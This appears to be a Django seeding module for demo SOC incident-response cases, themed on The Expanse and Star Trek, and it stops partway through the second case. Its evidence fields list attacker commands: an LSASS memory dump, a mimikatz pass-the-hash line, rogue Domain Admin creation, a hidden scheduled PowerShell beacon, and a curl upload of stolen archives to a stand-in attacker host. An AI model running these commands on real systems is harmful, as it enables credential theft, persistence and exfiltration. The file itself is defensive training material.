"""
Demonstration SOC Incident Response scenarios available exclusively to Super Admin accounts.

Scenarios included:
  1. expanse   — The Expanse: Unauthorized VPN Intrusion, Active Directory Compromise & Data Exfiltration
  2. star_trek — Star Trek: Subspace Portal Website Compromise, Web Shell Deployment & DB Credential Theft
  3. matrix    — The Matrix: ClickFix Clipboard Execution Lure to Domain Controller DCSync Takeover
  4. star_wars — Star Wars: Adversary-in-the-Middle (MitM) Phishing, Spam Campaign & Multi-Account Takeover
"""

import io
from datetime import datetime, timezone as dt_timezone
from django.core.files.base import ContentFile
from PIL import Image as PilImage, ImageDraw

from .models import (
    CustomerContact,
    EvidenceItem,
    EvidenceScreenshot,
    ExternalResearch,
    Project,
    RelatedIncident,
)
from .reports import (
    generate_key_evidence_markdown,
    generate_key_evidence_odt,
    generate_timeline_csv,
)


DEMO_SCENARIO_CATALOG = [
    {
        "id": "expanse",
        "theme": "The Expanse",
        "label": "The Expanse — VPN Intrusion, AD Compromise & Exfiltration",
        "customer_name": "Tycho Manufacturing & Logistics",
        "description": (
            "Perimeter SSL-VPN password spray against Tycho Manufacturing, WinRM lateral movement, "
            "LSASS dump, rogue Domain Admin creation, and staged 7-Zip HTTPS exfiltration."
        ),
    },
    {
        "id": "star_trek",
        "theme": "Star Trek",
        "label": "Star Trek — Website Compromise & Web Shell Deployment",
        "customer_name": "Daystrom Institute & Utopia Planitia Yards",
        "description": (
            "Exploitation of public subspace portal file-upload vulnerability to deploy obfuscated "
            "web shells, execute commands via web worker processes, harvest database credentials, and stage schematics."
        ),
    },
    {
        "id": "matrix",
        "theme": "The Matrix",
        "label": "The Matrix — ClickFix User Compromise to Domain Controller Takeover",
        "customer_name": "MetaCortex Software Corporation",
        "description": (
            "Social-engineered ClickFix clipboard verification lure on end-user workstation escalating via "
            "Kerberoasting and WMI lateral movement to full Domain Controller DCSync takeover."
        ),
    },
    {
        "id": "star_wars",
        "theme": "Star Wars",
        "label": "Star Wars — MitM Phishing, Spam Wave & Multiple Account Takeovers",
        "customer_name": "Corellian Engineering Corporation",
        "description": (
            "Adversary-in-the-Middle (AiTM/MitM) reverse-proxy phishing capturing MFA session cookies, "
            "stealth inbox rules, internal/partner spam distribution, and multi-account takeovers."
        ),
    },
]


def _create_sample_terminal_screenshot(title: str, lines: list[str]) -> bytes:
    """Generates a realistic terminal/SIEM screenshot PNG for demo evidence."""
    img = PilImage.new("RGB", (840, 320), color=(12, 21, 40))
    draw = ImageDraw.Draw(img)
    draw.rectangle([(0, 0), (840, 36)], fill=(0, 19, 56))
    draw.text((20, 11), title, fill=(241, 245, 249))

    y = 54
    for line in lines:
        draw.text((20, y), line, fill=(203, 213, 225))
        y += 24

    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def _materialize_scenario(spec: dict) -> Project:
    """Creates a Project and all child records, screenshots, reports, and archive manifest from `spec`."""
    project = Project.objects.create(**spec["project"])

    for contact in spec.get("contacts", []):
        CustomerContact.objects.create(project=project, **contact)

    for rel in spec.get("related_incidents", []):
        RelatedIncident.objects.create(project=project, **rel)

    for research in spec.get("research", []):
        ExternalResearch.objects.create(project=project, **research)

    for ev_spec in spec.get("events", []):
        ev = EvidenceItem.objects.create(
            project=project,
            evidence_type=ev_spec["type"],
            analyst_name=ev_spec["analyst"],
            timestamp=ev_spec["ts"],
            end_timestamp=ev_spec["end_ts"],
            summary=ev_spec["summary"],
            affected_asset=ev_spec["asset"],
            affected_user=ev_spec["user"],
            user_created_by_attacker=ev_spec["attacker_user"],
            malicious_hosts_ips=ev_spec["indicators"],
            commands_run=ev_spec["cmd"],
            mitre_tactic=ev_spec["tactic"],
            mitre_technique=ev_spec["technique"],
            related_log_link=ev_spec["log_link"],
            search_result_link=ev_spec["res_link"],
            search_query_link=ev_spec["qry_link"],
            notes=ev_spec["notes"],
            is_key_evidence=ev_spec["key"],
        )
        if ev_spec.get("shot"):
            filename, title, lines = ev_spec["shot"]
            png_bytes = _create_sample_terminal_screenshot(title, lines)
            shot = EvidenceScreenshot(
                evidence=ev,
                caption=title,
                analyst_name=ev_spec["analyst"],
            )
            shot.image.save(filename, ContentFile(png_bytes), save=True)

    generate_timeline_csv(project)
    generate_key_evidence_odt(project)
    generate_key_evidence_markdown(project)
    project.sync_archive_manifest()
    return project


def _get_expanse_spec() -> dict:
    return {
        "project": {
            "title": "Unauthorized VPN Intrusion, Active Directory Compromise & Data Exfiltration",
            "customer_name": "Tycho Manufacturing & Logistics",
            "customer_id": "CUST-90421",
            "ticket_id": "SOC-2026-9041",
            "ticket_link": "https://soc.internal.example/tickets/SOC-2026-9041",
            "summary": (
                "Threat actor compromised perimeter SSL-VPN gateway VPN-GW-01 via password spraying, "
                "pivoted over WinRM/SMB to application server WIN-WEB-04 and file server FS-CORP-02, "
                "dumped LSASS credentials, created rogue Domain Admin account svc_backup_adm on DC-PROD-01, "
                "deployed a scheduled task beacon to c2.ceres-telemetry.net, and staged encrypted 7-Zip "
                "archives before containment."
            ),
            "action_plan": (
                "1. Confirm KRBTGT double-reset maintenance window with Tycho Infrastructure Ops.\n"
                "2. Complete forensic disk triage on FS-CORP-02 to verify exact Engineering$ schematics accessed.\n"
                "3. Awaiting confirmation from customer whether billing_dump.csv contained active payment tokens.\n"
                "4. Enforce FIDO2 hardware MFA across all perimeter VPN profiles prior to lifting Geo-IP blocks."
            ),
            "key_customer_contacts": "24/7 Tycho Station Ops Bridge: +1-555-0199 (ext. 402)",
            "key_assets_affected": (
                "VPN-GW-01 (10.10.1.5)\n"
                "WIN-WEB-04 (10.20.4.18)\n"
                "FS-CORP-02 (10.20.8.22)\n"
                "SQL-FIN-01 (10.20.12.50)\n"
                "DC-PROD-01 (10.20.0.10)"
            ),
            "key_users_affected": (
                "TYCHO\\j.miller\n"
                "TYCHO\\svc_iis_pool\n"
                "TYCHO\\adm_k.nagata\n"
                "TYCHO\\svc_backup_adm (Created by Attacker)"
            ),
            "key_malicious_indicators": (
                "185.220.101.44\n"
                "91.214.124.88\n"
                "45.155.205.109\n"
                "cdn-update-telemetry.net\n"
                "c2.ceres-telemetry.net\n"
                "stage.7z\n"
                "comsvcs.dll\n"
                "updater_svc.ps1"
            ),
            "status": "INVESTIGATING",
            "lead_analyst": "Chrisjen Avasarala",
        },
        "contacts": [
            {
                "name": "Fred Johnson",
                "role_title": "VP of Operations & Station Security",
                "email": "f.johnson@tycho-manufacturing.example",
                "phone": "+1-555-0142",
                "notes": "Primary executive escalation point; approves Tier-0 AD remediation windows.",
            },
            {
                "name": "Camina Drummer",
                "role_title": "Director of Infrastructure & SOC Liaison",
                "email": "c.drummer@tycho-manufacturing.example",
                "phone": "+1-555-0188",
                "notes": "Hands-on technical lead coordinating firewall blocks and EDR isolation.",
            },
        ],
        "related_incidents": [
            {
                "title": "TIER2-8812: Initial Perimeter SSL-VPN Password Spray Alert",
                "link": "https://soc.internal.example/escalations/TIER2-8812",
                "analyst_name": "James Holden",
            },
            {
                "title": "DLP-2026-0419: Outbound TLS Volume Anomaly from DC-PROD-01",
                "link": "https://soc.internal.example/escalations/DLP-2026-0419",
                "analyst_name": "Chrisjen Avasarala",
            },
        ],
        "research": [
            {
                "link": "https://attack.mitre.org/techniques/T1110/003/",
                "summary": "MITRE ATT&CK T1110.003 - Password Spraying against perimeter SSL-VPN gateways.",
                "analyst_name": "Chrisjen Avasarala",
            },
            {
                "link": "https://attack.mitre.org/techniques/T1003/001/",
                "summary": "MITRE ATT&CK T1003.001 - OS Credential Dumping: LSASS Memory via rundll32 comsvcs.dll MiniDump.",
                "analyst_name": "James Holden",
            },
            {
                "link": "https://attack.mitre.org/techniques/T1136/002/",
                "summary": "MITRE ATT&CK T1136.002 - Create Account: Domain Account persistence pattern.",
                "analyst_name": "Chrisjen Avasarala",
            },
        ],
        "events": [
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 0, 45, 12, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "VPN-GW-01 (10.10.1.5)",
                "user": "",
                "attacker_user": False,
                "summary": "External port & SSL/TLS cipher enumeration scan against VPN-GW-01 from 45.155.205.109.",
                "notes": "Pre-attack reconnaissance identifying SSL-VPN login portal endpoints.",
                "indicators": "45.155.205.109",
                "cmd": "",
                "tactic": "Reconnaissance (TA0043)",
                "technique": "T1595.002 - Active Scanning: Vulnerability Scanning",
                "log_link": "https://ids.internal.example/alerts/suricata-900101",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 1, 12, 0, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 17, 1, 34, 15, tzinfo=dt_timezone.utc),
                "asset": "VPN-GW-01 (10.10.1.5)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "Sustained password spray (412 failed logins followed by 1 success) from 185.220.101.44 targeting TYCHO\\j.miller.",
                "notes": "MFA push fatigue suspected; user accepted prompt at 01:34:15 UTC and was assigned VPN pool IP 10.10.99.104.",
                "indicators": "185.220.101.44",
                "cmd": "",
                "tactic": "Initial Access (TA0001); Credential Access (TA0006)",
                "technique": "T1078.002 - Valid Accounts: Domain Accounts; T1110.003 - Brute Force: Password Spraying",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/vpn-spray-20261017",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(event.dataset:vpn.auth%20AND%20source.ip:185.220.101.44)",
                "key": True,
                "shot": (
                    "vpn_credential_spray.png",
                    "SIEM Query: VPN Auth Spray (01:12:00 - 01:34:15 UTC)",
                    [
                        "[SIEM] index=vpn_logs src_ip=185.220.101.44 | stats count by action, user",
                        "01:12:04 - 01:33:58 UTC | action=failure | count=412 | user=TYCHO\\j.miller",
                        "01:34:15 UTC            | action=success | count=1   | user=TYCHO\\j.miller",
                        "Assigned VPN Pool IP: 10.10.99.104",
                    ],
                ),
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 1, 36, 40, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "VPN-GW-01 (10.10.1.5)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "SSL-VPN tunnel session established and internal DNS resolver queried for _ldap._tcp.dc._msdcs.",
                "notes": "Immediate Active Directory domain controller discovery upon VPN connection.",
                "indicators": "185.220.101.44, 10.10.99.104",
                "cmd": "nslookup -type=SRV _ldap._tcp.dc._msdcs.tycho.local",
                "tactic": "Discovery (TA0007)",
                "technique": "T1018 - Remote System Discovery",
                "log_link": "https://siem.internal.example/events/dns-441092",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 1, 39, 10, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 17, 1, 43, 55, tzinfo=dt_timezone.utc),
                "asset": "WIN-WEB-04 (10.20.4.18)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "Internal TCP SYN scan from VPN client 10.10.99.104 across 10.20.4.0/24 targeting ports 445, 3389, and 5985.",
                "notes": "Suricata IDS alerted on rapid SMB/WinRM port sweep.",
                "indicators": "10.10.99.104",
                "cmd": "nmap -sS -p 445,3389,5985 10.20.4.0/24",
                "tactic": "Discovery (TA0007)",
                "technique": "T1046 - Network Service Discovery",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/internal-port-sweep",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(source.ip:10.10.99.104%20AND%20destination.port:(445%20OR%205985))",
                "key": False,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 1, 46, 18, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WIN-WEB-04 (10.20.4.18)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "Remote PowerShell WinRM session (Event ID 4624 Type 3 & Microsoft-Windows-WinRM/Operational EID 91) established to WIN-WEB-04.",
                "notes": "Attacker used compromised j.miller credentials to pivot from VPN pool to application server WIN-WEB-04.",
                "indicators": "10.10.99.104, 10.20.4.18",
                "cmd": "Enter-PSSession -ComputerName WIN-WEB-04 -Credential TYCHO\\j.miller",
                "tactic": "Lateral Movement (TA0008)",
                "technique": "T1021.006 - Remote Services: Windows Remote Management",
                "log_link": "https://siem.internal.example/events/winrm-eid91-552019",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 1, 48, 0, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WIN-WEB-04 (10.20.4.18)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "Local host & privilege enumeration commands executed inside wsmprovhost.exe on WIN-WEB-04.",
                "notes": "Attacker checked local group memberships and active sessions.",
                "indicators": "10.20.4.18",
                "cmd": "whoami /all && net localgroup administrators && query user",
                "tactic": "Discovery (TA0007)",
                "technique": "T1033 - System Owner/User Discovery",
                "log_link": "https://edr.internal.example/events/sysmon-eid1-771022",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 1, 51, 33, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WIN-WEB-04 (10.20.4.18)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "PowerShell script-block logging (Event ID 4104) captured AMSI bypass attempt and Defender exclusion check.",
                "notes": "Attempted to disable real-time monitoring prior to credential dumping.",
                "indicators": "10.20.4.18",
                "cmd": "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath",
                "tactic": "Defense Evasion (TA0005)",
                "technique": "T1562.001 - Impair Defenses: Disable or Modify Tools",
                "log_link": "https://siem.internal.example/events/ps-eid4104-771290",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 1, 55, 10, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WIN-WEB-04 (10.20.4.18)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "EDR Sysmon Event ID 1 & 10: rundll32 comsvcs.dll MiniDump executed on WIN-WEB-04 to dump LSASS process memory.",
                "notes": "Domain Admin token for TYCHO\\adm_k.nagata extracted from cached interactive session on WIN-WEB-04.",
                "indicators": "185.220.101.44, 10.20.4.18, comsvcs.dll, debug.bin",
                "cmd": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\debug.bin full",
                "tactic": "Credential Access (TA0006)",
                "technique": "T1003.001 - OS Credential Dumping: LSASS Memory",
                "log_link": "https://edr.internal.example/events/sysmon-eid10-882741",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": (
                    "lsass_minidump_edr.png",
                    "EDR Telemetry: LSASS Access via comsvcs.dll on WIN-WEB-04",
                    [
                        "[EDR] host=WIN-WEB-04 EventCode IN (1, 10) TargetImage=*lsass.exe",
                        "$ rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\debug.bin full",
                        "GrantedAccess=0x1fffff | CallTrace=comsvcs.dll+0x241a0",
                    ],
                ),
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 1, 58, 42, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WIN-WEB-04 (10.20.4.18)",
                "user": "TYCHO\\j.miller",
                "attacker_user": False,
                "summary": "Sysmon Event ID 23 (FileDelete): C:\\Windows\\Temp\\debug.bin removed after credential extraction.",
                "notes": "Attacker deleted the raw LSASS dump file after parsing credentials.",
                "indicators": "debug.bin",
                "cmd": "Remove-Item -Path C:\\Windows\\Temp\\debug.bin -Force",
                "tactic": "Defense Evasion (TA0005)",
                "technique": "T1070.004 - Indicator Removal: File Deletion",
                "log_link": "https://edr.internal.example/events/sysmon-eid23-882910",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 2, 1, 15, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "WIN-WEB-04 (10.20.4.18)",
                "user": "TYCHO\\svc_iis_pool",
                "attacker_user": False,
                "summary": "IIS application pool configuration inspected to extract connection strings for SQL-FIN-01.",
                "notes": "Read web.config from C:\\inetpub\\wwwroot\\portal\\web.config.",
                "indicators": "10.20.4.18, web.config",
                "cmd": "type C:\\inetpub\\wwwroot\\portal\\web.config | findstr /i connectionString",
                "tactic": "Credential Access (TA0006)",
                "technique": "T1552.001 - Unsecured Credentials: Credentials In Files",
                "log_link": "https://edr.internal.example/events/sysmon-eid1-883104",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 2, 4, 0, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 17, 2, 8, 30, tzinfo=dt_timezone.utc),
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\adm_k.nagata",
                "attacker_user": False,
                "summary": "Pass-the-Hash NTLM network logons (Event ID 4624 LogonType 3, AuthPackage NTLM) from WIN-WEB-04 to DC-PROD-01 and FS-CORP-02 using stolen adm_k.nagata hash.",
                "notes": "Anomalous NTLM authentication across tier-0 domain controller from web tier.",
                "indicators": "10.20.4.18, 10.20.0.10",
                "cmd": "sekurlsa::pth /user:adm_k.nagata /domain:tycho.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c",
                "tactic": "Lateral Movement (TA0008)",
                "technique": "T1550.002 - Use Alternate Authentication Material: Pass the Hash",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/pth-ntlm-dc-logons",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(event.code:4624%20AND%20winlog.event_data.AuthenticationPackageName:NTLM%20AND%20user.name:adm_k.nagata)",
                "key": True,
                "shot": (
                    "pth_ntlm_lateral_movement.png",
                    "SIEM Search: Pass-the-Hash NTLM Logons to DC-PROD-01",
                    [
                        "[SIEM] EventCode=4624 LogonType=3 AuthPackage=NTLM src_ip=10.20.4.18",
                        "02:04:12 UTC | dest=DC-PROD-01 | user=TYCHO\\adm_k.nagata | NTLMv2",
                        "02:06:48 UTC | dest=FS-CORP-02 | user=TYCHO\\adm_k.nagata | NTLMv2",
                    ],
                ),
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 2, 9, 10, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\adm_k.nagata",
                "attacker_user": False,
                "summary": "Active Directory enterprise admin and domain trust enumeration executed on DC-PROD-01.",
                "notes": "Attacker enumerated privileged groups before creating persistence account.",
                "indicators": "10.20.0.10",
                "cmd": 'net group "Domain Admins" /domain && nltest /domain_trusts',
                "tactic": "Discovery (TA0007)",
                "technique": "T1069.002 - Permission Groups Discovery: Domain Groups",
                "log_link": "https://edr.internal.example/events/sysmon-eid1-900112",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 2, 11, 5, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 17, 2, 14, 20, tzinfo=dt_timezone.utc),
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "Attacker created rogue account 'svc_backup_adm' (Event ID 4720) and added it to Domain Admins (Event ID 4728) on DC-PROD-01.",
                "notes": "Confirmed unauthorized service account created for domain persistence.",
                "indicators": "10.20.0.10",
                "cmd": 'net user svc_backup_adm P@ssw0rd2026! /add /domain\nnet group "Domain Admins" svc_backup_adm /add /domain',
                "tactic": "Persistence (TA0003)",
                "technique": "T1136.002 - Create Account: Domain Account",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/dc-rogue-account-4720",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(host.name:DC-PROD-01%20AND%20event.code:(4720%20OR%204728))",
                "key": True,
                "shot": (
                    "rogue_domain_admin_creation.png",
                    "Domain Controller Security Audit: Event ID 4720 & 4728",
                    [
                        "[SIEM] host=DC-PROD-01 EventID IN (4720, 4728) TargetUserName=svc_backup_adm",
                        "02:11:09 UTC | EventID=4720 (User Account Created)  | Target=svc_backup_adm",
                        "02:11:18 UTC | EventID=4728 (Added to Global Group) | Group=Domain Admins",
                    ],
                ),
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 2, 16, 45, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "Scheduled task 'WindowsTelemetrySync' registered (Event ID 4698) to execute C:\\ProgramData\\updater_svc.ps1 every 15 minutes.",
                "notes": "Script beacons over HTTPS to c2.ceres-telemetry.net (45.155.205.109).",
                "indicators": "45.155.205.109, c2.ceres-telemetry.net, updater_svc.ps1",
                "cmd": 'schtasks /create /tn "WindowsTelemetrySync" /tr "powershell.exe -ep bypass -w hidden -f C:\\ProgramData\\updater_svc.ps1" /sc minute /mo 15 /ru SYSTEM',
                "tactic": "Persistence (TA0003); Execution (TA0002)",
                "technique": "T1053.005 - Scheduled Task/Job: Scheduled Task; T1059.001 - Command and Scripting Interpreter: PowerShell",
                "log_link": "https://siem.internal.example/events/sec-eid4698-900451",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 2, 18, 0, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 17, 2, 22, 10, tzinfo=dt_timezone.utc),
                "asset": "FS-CORP-02 (10.20.8.22)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "High-volume SMB file reads on \\\\FS-CORP-02\\Engineering$ and \\\\FS-CORP-02\\Finance$ shares.",
                "notes": "Event ID 5145 shows recursive directory listing and read access to sensitive schematics.",
                "indicators": "10.20.8.22",
                "cmd": "",
                "tactic": "Collection (TA0009)",
                "technique": "T1039 - Data from Network Shared Drive",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/smb-share-collection-5145",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(host.name:FS-CORP-02%20AND%20event.code:5145%20AND%20user.name:svc_backup_adm)",
                "key": False,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 2, 23, 5, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "SQL-FIN-01 (10.20.12.50)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "sqlcmd utility executed on SQL-FIN-01 to export customer billing table to CSV.",
                "notes": "Exported 14,200 customer records to temporary staging folder.",
                "indicators": "10.20.12.50, billing_dump.csv",
                "cmd": 'sqlcmd -S localhost -Q "SELECT * FROM FinanceDB.dbo.CustomerBilling" -o C:\\Windows\\Temp\\billing_dump.csv -s","',
                "tactic": "Collection (TA0009)",
                "technique": "T1005 - Data from Local System",
                "log_link": "https://edr.internal.example/events/sysmon-eid1-901220",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 2, 24, 50, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "7-Zip command-line binary used to compress collected shares and database dump into password-protected archive stage.7z.",
                "notes": "Archive size approximately 480 MB staged in C:\\Windows\\Temp\\stage.7z.",
                "indicators": "stage.7z, 7za.exe",
                "cmd": "C:\\Windows\\Temp\\7za.exe a -p8891aK! C:\\Windows\\Temp\\stage.7z C:\\Windows\\Temp\\collected\\*",
                "tactic": "Collection (TA0009)",
                "technique": "T1560.001 - Archive Collected Data: Archive via Utility",
                "log_link": "https://edr.internal.example/events/sysmon-eid1-901588",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 2, 26, 10, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 17, 2, 29, 45, tzinfo=dt_timezone.utc),
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "Outbound HTTPS POST transfer of C:\\Windows\\Temp\\stage.7z to cdn-update-telemetry.net (91.214.124.88:443).",
                "notes": "Firewall flow logs show 112 MB transferred before egress block rule triggered.",
                "indicators": "91.214.124.88, cdn-update-telemetry.net, stage.7z",
                "cmd": "curl.exe -X POST https://cdn-update-telemetry.net/upload -F file=@C:\\Windows\\Temp\\stage.7z",
                "tactic": "Exfiltration (TA0010)",
                "technique": "T1041 - Exfiltration Over C2 Channel",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/egress-https-exfil-91-214-124-88",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(destination.ip:91.214.124.88%20AND%20source.ip:10.20.0.10)",
                "key": True,
                "shot": (
                    "https_exfiltration_flow.png",
                    "Firewall & Proxy Telemetry: HTTPS Exfiltration to 91.214.124.88",
                    [
                        "[SIEM] src_ip=10.20.0.10 dest_ip=91.214.124.88 sni=cdn-update-telemetry.net",
                        "$ curl.exe -X POST https://cdn-update-telemetry.net/upload -F file=@C:\\Windows\\Temp\\stage.7z",
                        "BytesSent=117440512 | Action=ConnectionResetByFirewall (02:29:45 UTC)",
                    ],
                ),
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "James Holden",
                "ts": datetime(2026, 10, 17, 2, 31, 0, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "Periodic PowerShell C2 beacon attempt from updater_svc.ps1 to c2.ceres-telemetry.net blocked at perimeter firewall.",
                "notes": "Confirmed scheduled task persistence attempted callback after exfiltration interruption.",
                "indicators": "45.155.205.109, c2.ceres-telemetry.net, updater_svc.ps1",
                "cmd": "powershell.exe -ep bypass -w hidden -f C:\\ProgramData\\updater_svc.ps1",
                "tactic": "Command and Control (TA0011)",
                "technique": "T1071.001 - Application Layer Protocol: Web Protocols",
                "log_link": "https://siem.internal.example/events/fw-drop-902114",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Chrisjen Avasarala",
                "ts": datetime(2026, 10, 17, 2, 35, 20, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "DC-PROD-01 (10.20.0.10)",
                "user": "TYCHO\\svc_backup_adm",
                "attacker_user": True,
                "summary": "SOC containment executed: rogue account svc_backup_adm disabled (Event ID 4725), scheduled task removed, and WIN-WEB-04 isolated in EDR.",
                "notes": "Password resets enforced for j.miller and adm_k.nagata; active VPN sessions terminated.",
                "indicators": "185.220.101.44, 91.214.124.88, 45.155.205.109",
                "cmd": "",
                "tactic": "",
                "technique": "",
                "log_link": "https://soc.internal.example/tickets/SOC-2026-9041/containment-log",
                "res_link": "",
                "qry_link": "",
                "key": False,
                "shot": None,
            },
        ],
    }


def _get_star_trek_spec() -> dict:
    return {
        "project": {
            "title": "Subspace Research Portal Compromise, Web Shell Deployment & Database Credential Theft",
            "customer_name": "Daystrom Institute & Utopia Planitia Yards",
            "customer_id": "CUST-47170",
            "ticket_id": "SOC-2026-4701",
            "ticket_link": "https://soc.internal.example/tickets/SOC-2026-4701",
            "summary": (
                "An external threat actor exploited an unauthenticated multipart file-upload bypass on the "
                "public-facing Subspace Research Portal (WEB-LCARS-01) to drop an obfuscated PHP web shell "
                "(eps_conduit.php), executed OS commands under www-data, harvested database credentials from "
                ".env configuration files, pivoted to internal Warp Telemetry IIS host (IIS-UTOPIA-02) to plant "
                "a secondary ASPX web shell (tachyon_relay.aspx), queried warp-core schematics from PGSQL-DAYSTROM-01, "
                "and installed a cron persistence job before WAF virtual patching and host isolation."
            ),
            "action_plan": (
                "1. Rotate PostgreSQL role `svc_lcars_portal` and Utopia Planitia API signing keys immediately.\n"
